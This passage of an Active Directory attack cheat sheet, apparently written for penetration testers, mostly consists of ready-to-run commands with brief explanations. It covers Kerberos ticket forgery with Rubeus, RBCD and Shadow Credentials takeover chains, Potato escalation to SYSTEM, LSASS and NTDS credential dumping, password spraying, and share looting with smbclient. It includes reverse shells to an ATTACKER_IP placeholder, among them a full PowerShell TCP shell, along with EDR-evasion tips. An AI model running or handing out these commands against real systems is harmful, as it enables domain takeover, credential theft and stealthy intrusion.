  /domain:DOMAIN.LOCAL /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  /krbtgt:KRBTGT_HASH /nowrap /ptt

Rubeus.exe silver /user:Administrator /id:500 \
  /domain:DOMAIN.LOCAL /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  /service:cifs /rc4:MACHINE_HASH \
  /target:TARGET.DOMAIN.LOCAL /nowrap /ptt

Monitoring / harvesting

Why it works: on a host with unconstrained delegation, any user who authenticates leaves their TGT in memory. monitor/harvest watch for and grab new TGTs — pair with a coercion trick to force a DC to authenticate and capture DC01$.

Rubeus.exe monitor /interval:5 /nowrap             # watch for new TGTs
Rubeus.exe monitor /targetuser:DC01$ /interval:5  # watch for specific user
Rubeus.exe harvest /interval:30                    # auto-renew harvested TGTs
/nowrap prints the base64 ticket as one line — pipe directly into Rubeus.exe ptt /ticket:<base64> or save for later use.
10ACL-Based Shell Access▶

End-to-end chains that start from an AD object permission over a computer (or user) and end in an interactive shell. Each flow turns one ACL edge into code execution.

RBCD flow

Why the chain: create a machine account you control → write RBCD on the target so it trusts that account to impersonate → get the attacker machine's TGT → S4U to mint a cifs/ ticket as Administrator → use it with psexec/wmiexec. Each step feeds the next; the RBCD write is what makes the KDC agree to the impersonation.

GenericWrite/GenericAll on the target computer + MachineAccountQuota > 0 (or an existing machine account).
# 1. Create or use existing machine account
python3 addcomputer.py -computer-name 'ATTACKER$' \
  -computer-pass 'P@ssword123' DOMAIN.LOCAL/username:'Password123' -dc-ip DC_IP

# 2. Set RBCD — allow ATTACKER$ to impersonate users on TARGET
python3 rbcd.py -delegate-from 'ATTACKER$' -delegate-to 'TARGET$' \
  -action write DOMAIN.LOCAL/username:'Password123' -dc-ip DC_IP

# 3. Get TGT for the attacker machine account
python3 getTGT.py DOMAIN.LOCAL/'ATTACKER$':'P@ssword123' -dc-ip DC_IP
export KRB5CCNAME=ATTACKER$.ccache

# 4. S4U2Self + S4U2Proxy — impersonate Administrator on TARGET
python3 getST.py DOMAIN.LOCAL/'ATTACKER$':'P@ssword123' \
  -spn cifs/TARGET.DOMAIN.LOCAL \
  -impersonate Administrator -dc-ip DC_IP
export KRB5CCNAME=Administrator@cifs_TARGET.DOMAIN.LOCAL@DOMAIN.LOCAL.ccache

# 5. Shell
python3 psexec.py -k -no-pass DOMAIN.LOCAL/Administrator@TARGET.DOMAIN.LOCAL
python3 wmiexec.py -k -no-pass DOMAIN.LOCAL/Administrator@TARGET.DOMAIN.LOCAL

Shadow Credentials flow

Why prefer it: non-destructive takeover — write a KeyCredential to the target, authenticate with the resulting PFX via PKINIT, and get the target's hash + TGT without ever resetting its password.

GenericWrite/GenericAll on the target + PKINIT available on a DC.
# 1. Write KeyCredential to target
python3 pywhisker.py -d DOMAIN.LOCAL -u attacker -p 'Password123' \
  --target TARGET_USER --action add --dc-ip DC_IP
# 2. Authenticate with the pfx
certipy auth -pfx TARGET_USER.pfx -dc-ip DC_IP
# → outputs NTLM hash + CCACHE
export KRB5CCNAME=TARGET_USER.ccache

WriteDACL → grant yourself GenericAll

Why: if you can write an object's DACL you simply grant your own account FullControl, then run any of the flows above. Turns a single WriteDACL edge into full control of the object.

WriteDACL/WriteOwner on the target.
python3 dacledit.py -action write -rights FullControl \
  -principal attacker -target 'TARGET$' \
  DOMAIN.LOCAL/attacker:'Password123' -dc-ip DC_IP

On the box: privileges → SYSTEM

Why Potato works: SeImpersonatePrivilege (held by most service accounts) lets a process impersonate a token handed to it. The Potato tools coerce a SYSTEM service to authenticate to a local pipe, capture its token, and impersonate it — instant SYSTEM. After that, dump credentials.

SeImpersonatePrivilege on the host (check with whoami /priv).
whoami /all
whoami /priv
# Look for: SeImpersonatePrivilege, SeDebugPrivilege, SeBackupPrivilege

# SeImpersonate → SYSTEM via Potato (upload GodPotato / PrintSpoofer)
GodPotato-NET4.exe -cmd "cmd /c whoami"
GodPotato-NET4.exe -cmd "cmd /c net localgroup Administrators attacker /add"
PrintSpoofer.exe -c "nc.exe <ATTACKER_IP> 4444 -e cmd"

# After SYSTEM: dump SAM (reg save)
reg save HKLM\SAM C:\Windows\Temp\SAM
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY

# Or run mimikatz directly:
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# LSASS dump via comsvcs (no upload needed)
for /f "tokens=1,2" %a in ('tasklist /fi "imagename eq lsass.exe" /fo list ^| findstr "PID:"') do set lsasspid=%b
rundll32 C:\Windows\System32\comsvcs.dll MiniDump %lsasspid% C:\Windows\Temp\lsass.dmp full

12nxc — Recon & Enumeration▶

NetExec (formerly CrackMapExec) sprays one action across many hosts/protocols. Syntax: nxc <protocol> <target> -u USER -p PASS [options]. Also accepts -H NTLMHASH for pass-the-hash and --use-kcache -k for Kerberos (KRB5CCNAME must be set).

Host discovery + relay targets

Why the relay list: hosts with SMB signing not required can be targeted by NTLM relay. --gen-relay-list pulls exactly those out of a subnet sweep so you know where a coerced authentication can be relayed.

nxc smb 192.168.1.0/24                              # sweep subnet — OS, signing, hostname
nxc smb 192.168.1.0/24 --gen-relay-list relay.txt  # hosts without signing = relay targets

Null / guest access

Why try it: some DCs still allow anonymous or guest binds, which can leak the user list and password policy with no credentials at all.

nxc smb DC_IP -u '' -p ''                           # null session
nxc smb DC_IP -u 'Guest' -p ''                      # guest session

Credential validation

Why first: confirm a cred works (and whether it's local or domain) before building anything on it. --local-auth authenticates against the host's SAM rather than the domain.

nxc smb DC_IP -u username -p 'Password123'
nxc smb DC_IP -u username -p 'Password123' --local-auth   # local account
nxc smb DC_IP -u username -H NTLMHASH                     # pass-the-hash

User & RID enumeration

Why RID brute: even without rights to list users, you can walk the RID range over the SAMR pipe to recover every account name — often works from a null/guest session.

nxc smb DC_IP -u username -p 'Password123' --users
nxc smb DC_IP -u username -p 'Password123' --users | grep -i "badpwdcount\|admin"

# RID brute — enumerate all accounts (works with null/guest too)
nxc smb DC_IP -u '' -p '' --rid-brute
nxc smb DC_IP -u 'Guest' -p '' --rid-brute 10000

Groups & shares

Why spider shares: admins leave passwords in scripts, .config, and unattend.xml on readable shares — the spider crawls them so you can grep for creds.

nxc smb DC_IP -u username -p 'Password123' --groups
nxc smb DC_IP -u username -p 'Password123' --groups "Domain Admins"

nxc smb DC_IP -u username -p 'Password123' --shares
nxc smb DC_IP -u '' -p '' --shares                        # null session shares

nxc smb DC_IP -u username -p 'Password123' -M spider_plus
nxc smb DC_IP -u username -p 'Password123' -M spider_plus -o READ_ONLY=false

# Filter spider output for interesting extensions
cat /tmp/nxc_spider.json | python3 -c \
  "import json,sys; [print(f) for f in json.load(sys.stdin)['DC_IP']['shares'] if '.xml' in f or '.ini' in f or '.config' in f]"

Sessions & password policy

Why --pass-pol matters: it reveals the lockout threshold — you must know it before spraying or you'll lock accounts. --loggedon-users maps where privileged users are logged in (where to go hunt their tokens).

nxc smb DC_IP -u username -p 'Password123' --sessions
nxc smb DC_IP -u username -p 'Password123' --loggedon-users
nxc smb 192.168.1.0/24 -u username -p 'Password123' --loggedon-users  # domain-wide

nxc smb DC_IP -u username -p 'Password123' --pass-pol
# → reveals lockout threshold before spraying
13nxc — Password Spraying & Attacks▶
Always run --pass-pol first to check the lockout threshold before any spray.

Password spraying

Why spraying beats brute-force: one password against many users stays under the per-account lockout threshold. --continue-on-success keeps going after the first hit; --no-bruteforce pairs users/passwords line-by-line instead of trying every combination.

A user list and a realistic password; knowledge of the lockout policy.
nxc smb DC_IP -u users.txt -p 'Password123' --continue-on-success
nxc smb DC_IP -u users.txt -p 'Password123' --no-bruteforce   # one attempt per user

# Spray across all subnet hosts (find local admin reuse)
nxc smb 192.168.1.0/24 -u username -p 'Password123' --continue-on-success

# Paired spray: line-by-line user:pass from two files
nxc smb DC_IP -u users.txt -p passwords.txt --no-bruteforce --continue-on-success

# LDAP spray — quieter, doesn't touch NTLM/SMB logs on some configs
nxc ldap DC_IP -u users.txt -p 'Password123' --continue-on-success

Pass-the-Hash / Pass-the-Ticket

Why it works: NTLM accepts the hash directly, so you authenticate everywhere a reused local-admin hash is valid. Sweeping a subnet with one hash surfaces lateral-movement targets instantly. The Kerberos path reuses a cached TGT with no secret on the wire.

nxc smb TARGET_IP -u Administrator -H NTLMHASH
nxc smb 192.168.1.0/24 -u Administrator -H NTLMHASH     # spray all hosts
nxc smb TARGET_IP -u Administrator -H NTLMHASH --local-auth  # local admin

# Pass-the-Ticket (Kerberos CCACHE)
export KRB5CCNAME=/path/to/ticket.ccache
nxc smb TARGET_IP -u username --use-kcache -k
nxc smb DC_IP -u Administrator --use-kcache -k --ntds   # dump NTDS with ticket

Kerberoasting / AS-REP (see §05)

Why here too: nxc can roast in one line while you're already enumerating over LDAP. Concept, prerequisites and full cracking reference are in §05.

nxc ldap DC_IP -u username -p 'Password123' --kerberoasting kerberoast.txt
nxc ldap DC_IP -u username -H NTLMHASH --kerberoasting kerberoast.txt
hashcat -m 13100 kerberoast.txt rockyou.txt

nxc ldap DC_IP -u username -p 'Password123' --asreproast asrep.txt
nxc ldap DC_IP -u users.txt -p '' --asreproast asrep.txt  # no creds if you have a userlist
hashcat -m 18200 asrep.txt rockyou.txt

LAPS + local-admin discovery

Why: LAPS stores each machine's randomized local-admin password in ms-MCS-AdmPwd; if you can read it you get that host's local admin. A plain SMB sweep flags (Pwn3d!) wherever your creds already have local admin.

LAPS read: AllExtendedRights/ReadLAPSPassword on the computer object.
nxc ldap DC_IP -u username -p 'Password123' -M laps
nxc ldap DC_IP -u username -p 'Password123' -M laps -o COMPUTER=TARGET_NAME

nxc smb 192.168.1.0/24 -u username -p 'Password123'
# → Hosts showing "(Pwn3d!)" = local admin access confirmed
14nxc — Execution & Credential Dumping▶

Once a cred has local admin on a host, nxc can execute commands and pull secrets remotely over SMB.

Command execution

Why multiple methods: each exec method uses a different mechanism (service, WMI, scheduled task, MMC) so if one is blocked/logged you switch. smbexec drops no binary; atexec uses the scheduler; pick by what the host's monitoring is likeliest to miss.

Local admin on the target.
nxc smb TARGET_IP -u username -p 'Password123' -x 'whoami /all'
nxc smb TARGET_IP -u username -p 'Password123' -X 'Get-Process'            # PowerShell

# Execution methods (smbexec = no dropped binary; wmiexec = WMI; etc.)
nxc smb TARGET_IP -u username -p 'Password123' -x 'whoami' --exec-method smbexec
nxc smb TARGET_IP -u username -p 'Password123' -x 'whoami' --exec-method wmiexec
nxc smb TARGET_IP -u username -p 'Password123' -x 'whoami' --exec-method mmcexec
nxc smb TARGET_IP -u username -p 'Password123' -x 'whoami' --exec-method atexec

# Reverse shell via execution
nxc smb TARGET_IP -u username -p 'Password123' \
  -X '$c=New-Object Net.Sockets.TCPClient("ATTACKER_IP",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+"PS "+(pwd).Path+"&gt; ";$sb3=[text.encoding]::ASCII.GetBytes($sb2);$s.Write($sb3,0,$sb3.Length)}'

SAM / LSA / NTDS

Why each: --sam = local account hashes (reuse); --lsa = LSA secrets incl. service-account plaintexts; --ntds = the full domain hash database via DCSync/VSS against a DC. vss method snapshots the volume instead of calling the replication API — stealthier.

SAM/LSA: local admin on the host. NTDS: replication rights / DA against the DC.
nxc smb TARGET_IP -u username -p 'Password123' --sam
nxc smb 192.168.1.0/24 -u username -p 'Password123' --sam  # sweep all hosts

nxc smb TARGET_IP -u username -p 'Password123' --lsa

nxc smb DC_IP -u username -p 'Password123' --ntds
nxc smb DC_IP -u username -p 'Password123' --ntds --users Administrator  # single user
nxc smb DC_IP -u username -p 'Password123' --ntds vss    # VSS method (stealthier)

LSASS dump modules

Why modules differ: they trade stealth for reliability. lsassy reads LSASS memory remotely without writing a dump to disk; nanodump is tuned for EDR evasion; mimikatz is reliable but noisy.

nxc smb TARGET_IP -u username -p 'Password123' -M lsassy       # recommended
nxc smb TARGET_IP -u username -p 'Password123' -M nanodump      # EDR evasion
nxc smb TARGET_IP -u username -p 'Password123' -M procdump      # ProcDump upload + dump
nxc smb TARGET_IP -u username -p 'Password123' -M handlekatz    # handle duplication
nxc smb TARGET_IP -u username -p 'Password123' -M mimikatz      # direct mimikatz (noisy)

nxc smb TARGET_IP -u username -p 'Password123' -M lsassy -o METHOD=PROCDUMP

GPP passwords

Why it works: old Group Policy Preferences stored a password encrypted with a key Microsoft published, so any domain user who can read SYSVOL can decrypt it. Still found in many environments.

nxc smb DC_IP -u username -p 'Password123' -M gpp_password
nxc smb DC_IP -u username -p 'Password123' -M gpp_autologin
lsassy is the recommended LSASS module — it avoids writing a dump file to disk by reading memory remotely via a file handle. nanodump is the EDR-evasion pick.
15nxc — LDAP, WinRM, MSSQL & Modules▶

LDAP enumeration

Why these flags: each surfaces one classic misconfig — unconstrained delegation (capture any TGT), admin-count=1 (protected accounts), PASSWD_NOTREQD (blank-password logons), DONT_REQ_PREAUTH (AS-REP roastable), and MachineAccountQuota (can you add a machine for RBCD?). get-desc-users reads the description field where admins hide passwords.

nxc ldap DC_IP -u username -p 'Password123' --kdcHost DC_IP

nxc ldap DC_IP -u username -p 'Password123' --trusted-for-delegation   # unconstrained
nxc ldap DC_IP -u username -p 'Password123' --admin-count              # protected accts
nxc ldap DC_IP -u username -p 'Password123' --password-not-required
nxc ldap DC_IP -u username -p 'Password123' --no-preauth               # AS-REP roastable
nxc ldap DC_IP -u username -p 'Password123' -M maq                     # machine acct quota
nxc ldap DC_IP -u username -p 'Password123' -M get-desc-users          # creds in descriptions
nxc ldap DC_IP -u username -p 'Password123' -M adcs                    # enumerate CAs/templates
nxc ldap DC_IP -u username -p 'Password123' -M adcs -o SERVER=CA_SERVER

WinRM

Why: WinRM (5985/5986) gives a full remote PowerShell session. Sweeping a subnet shows where your account can get an interactive shell via evil-winrm.

nxc winrm TARGET_IP -u username -p 'Password123'
nxc winrm TARGET_IP -u username -H NTLMHASH                # PTH into WinRM
nxc winrm TARGET_IP -u username -p 'Password123' -x 'whoami'
nxc winrm 192.168.1.0/24 -u username -p 'Password123'      # find WinRM access

Why it escalates: SQL Server runs as a service account and can run OS commands via xp_cmdshell. If you can enable it (sysadmin, or via mssql_priv privesc) you execute as that service account — often a fast path to SYSTEM.

nxc mssql DB_IP -u sa -p 'Password123'
nxc mssql DB_IP -u sa -p 'Password123' --local-auth
nxc mssql DB_IP -u sa -p 'Password123' -q 'SELECT name FROM sys.databases'

Vulnerability & coercion checks

Why coercion matters: PetitPotam/PrintNightmare/WebDAV can force a target (even a DC) to authenticate to you. That coerced auth is the trigger for NTLM relay — relay it to ADCS (ESC8, §06) or an unsigned host for machine takeover. Run ZeroLogon/EternalBlue checks in check-only mode on production.

# PrintNightmare — Print Spooler RCE (CVE-2021-1675 / CVE-2021-34527)
nxc smb TARGET_IP -u username -p 'Password123' -M printnightmare

# ZeroLogon — safe check ONLY (never run exploit on production)
nxc smb DC_IP -u '' -p '' -M zerologon

# PetitPotam — NTLM coercion via MS-EFSR (trigger for relay)
nxc smb TARGET_IP -u username -p 'Password123' -M petitpotam \
  -o LISTENER=<ATTACKER_IP>

# WebDAV — detect WebClient service (enables HTTP-based coercion)
nxc smb TARGET_IP -u username -p 'Password123' -M webdav

# EternalBlue MS17-010 (unauthenticated)
nxc smb TARGET_IP -u '' -p '' -M ms17-010

# BloodHound collection via nxc
nxc smb DC_IP -u username -p 'Password123' -M bloodhound \

16SMB Share Access — smbclient & smbclient.py▶

Shares are where credentials leak — SYSVOL/NETLOGON hold GPO scripts, and department shares hold config files and spreadsheets. These tools list, read and mount shares to hunt for secrets.

smbclient (native)

Why list first: enumerating shares shows what you can reach (including with a null/guest session). SYSVOL is readable by every domain user and is the prime hunting ground for GPP creds and logon scripts.

# ── List shares ──────────────────────────────────────────────────────────────
smbclient -L //DC_IP -U 'username%Password123'
smbclient -L //DC_IP -U 'DOMAIN\username%Password123'
smbclient -L //DC_IP -N                                   # null session (no creds)
smbclient -L //DC_IP -U 'Guest%'                         # guest session

# With NTLM hash (pass-the-hash)
smbclient -L //DC_IP -U 'username' --pw-nt-hash NTLMHASH

# Kerberos (KRB5CCNAME must be set)
smbclient -L //DC_IP -U 'username' -k

# ── Connect to a share ────────────────────────────────────────────────────────
smbclient //DC_IP/SHARENAME -U 'username%Password123'
smbclient //DC_IP/SHARENAME -U 'DOMAIN\username%Password123'
smbclient //DC_IP/SHARENAME -N                            # null session
smbclient //DC_IP/SHARENAME -U 'username' --pw-nt-hash NTLMHASH
smbclient //DC_IP/SHARENAME -U 'username' -k             # Kerberos

# ── Common shares to check ───────────────────────────────────────────────────
smbclient //DC_IP/C$ -U 'username%Password123'           # full C: drive (admin)
smbclient //DC_IP/ADMIN$ -U 'username%Password123'       # Windows install dir (admin)
smbclient //DC_IP/SYSVOL -U 'username%Password123'       # GPO files — hunt GPP creds
smbclient //DC_IP/NETLOGON -U 'username%Password123'     # logon scripts

Inside the smbclient shell

Why prompt off; recurse on: disables the per-file y/n and walks subdirectories so mget * pulls an entire tree in one go — the fast way to loot a share for offline grepping.

# smb: \>
ls                           # list current directory
cd subfolder                 # change directory
lcd /local/path              # change LOCAL working directory
get filename                 # download a file
put /local/file remote_name  # upload a file
mget *                       # download ALL files in current dir
mget *.xml                   # download matching files

# Toggle prompts and recursion for bulk operations
prompt off                   # disable y/n confirmation on mget/mput
recurse on                   # enable recursive traversal
mget *                       # now downloads entire directory tree

Non-interactive one-liners

Why -c: scriptable, so you can automate looting across hosts without an interactive session.

smbclient //DC_IP/SHARENAME -U 'username%Password123' -c 'ls'

# Recursively download everything in the share
smbclient //DC_IP/SHARENAME -U 'username%Password123' \
  -c 'prompt off; recurse on; mget *'

# Download to a specific local dir
smbclient //DC_IP/SHARENAME -U 'username%Password123' \
  -c 'prompt off; recurse on; lcd /tmp/loot; mget *'

# Download a specific file / upload a payload
smbclient //DC_IP/SHARENAME -U 'username%Password123' -c 'get scripts\backup.ps1'
smbclient //DC_IP/SHARENAME -U 'username%Password123' -c 'put /tmp/shell.exe shell.exe'

# List SYSVOL recursively (hunt for GPP creds / passwords in scripts)
smbclient //DC_IP/SYSVOL -U 'username%Password123' \
  -c 'prompt off; recurse on; ls'

Mount as a filesystem

Why mount: turns the share into a local path so you can grep -ri across everything and find for keepass/pfx/unattend files — far faster than clicking through folders.

sudo mkdir -p /mnt/smb
sudo mount -t cifs //DC_IP/SHARENAME /mnt/smb \
  -o username=username,password='Password123',domain=DOMAIN
sudo mount -t cifs //DC_IP/SHARENAME /mnt/smb \
  -o username=username,password='Password123',domain=DOMAIN,vers=3.0

# After mounting — grep for passwords across the whole share
grep -ri 'password' /mnt/smb/ 2>/dev/null
grep -ri 'pass' /mnt/smb/ --include='*.xml' --include='*.ini' --include='*.config'
find /mnt/smb -name '*.kdbx' -o -name '*.pfx' -o -name 'unattend*' 2>/dev/null

sudo umount /mnt/smb

smbclient.py (Impacket) + smbmap

Why smbmap: it prints the READ/WRITE/NO-ACCESS permission per share up front, so you instantly see which shares are worth your time and which you can write to (payload drop).

# ── Connect + list shares ─────────────────────────────────────────────────────
python3 smbclient.py DOMAIN.LOCAL/username:'Password123'@DC_IP
python3 smbclient.py DOMAIN.LOCAL/username@DC_IP -hashes :NTLMHASH

# Kerberos (KRB5CCNAME must be set)
export KRB5CCNAME=ticket.ccache
python3 smbclient.py DOMAIN.LOCAL/username@DC01.DOMAIN.LOCAL -k -no-pass

# ── Inside the smbclient.py shell ────────────────────────────────────────────
shares                            # list all available shares
use SHARENAME                     # connect to a share (required before ls/get)
ls                                # list current directory
get filename                      # download a file
put /local/file                   # upload a file
cat filename                      # print file contents to stdout
info                              # connection info (hostname, OS, signing)

# ── Non-interactive with -c ───────────────────────────────────────────────────
python3 smbclient.py DOMAIN.LOCAL/username:'Password123'@DC_IP -c 'shares'
python3 smbclient.py DOMAIN.LOCAL/username:'Password123'@DC_IP -c 'use C$; ls'
python3 smbclient.py DOMAIN.LOCAL/username:'Password123'@DC_IP \
  -c 'use SYSVOL; cat DOMAIN.LOCAL/Policies/{GUID}/Machine/Preferences/Groups/Groups.xml'

# ── smbmap — permission-aware share listing ──────────────────────────────────
smbmap -H DC_IP -u username -p 'Password123'             # list shares + R/W/NO ACCESS
smbmap -H DC_IP -u username -p 'Password123' -r SHARE    # list share contents
smbmap -H DC_IP -u username -p 'Password123' -R SHARE    # recursive listing
smbmap -H DC_IP -u '' -p ''                              # null session
smbmap -H DC_IP -u username -p 'Password123' \
  --download 'SHARE\path\file.txt'                       # download specific file
